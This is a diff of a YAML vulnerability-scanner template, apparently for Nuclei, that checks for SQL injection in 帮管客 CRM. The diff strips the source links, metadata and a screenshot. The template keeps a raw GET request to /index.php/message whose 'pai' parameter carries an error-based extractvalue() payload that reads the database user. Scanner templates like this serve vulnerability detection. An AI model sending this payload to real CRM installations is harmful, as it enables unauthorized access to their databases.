@@ -3,13 +3,8 @@ info:
   name: 帮管客CRM SQL注入
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vvepbev9ngzuyisp
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: vvepbev9ngzuyisp
 http:
 - raw:
   - 'GET /index.php/message?page=1&pai=1%20and%20extractvalue(0x7e,concat(0x7e,(select+user%28%29),0x7e))%23&xu=desc HTTP/1.1
@@ -25,9 +20,6 @@ http:
 
 
     Connection: close
-
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1717059765071-ec7c5898-1a39-44b2-b021-5ea24685fc9f.png)
 
 
     ## 修复建议
